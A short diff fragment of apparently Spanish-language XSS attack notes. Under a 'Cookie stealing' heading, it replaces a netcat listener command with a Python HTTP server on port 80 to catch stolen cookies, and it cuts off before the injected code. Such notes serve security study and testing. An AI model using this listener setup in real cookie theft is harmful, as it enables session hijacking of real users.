@@ -21,7 +21,7 @@ En ocastiones no es necesario las etiquetas <script>, o incluso es necesario no 
 ### Cookie stealing
 Se puede poner netcat a la escucha:  
 ```
-nc -nlvp 80
+python3 -m http.server 80
 ```
 
 E inyectar el siguiente código:  
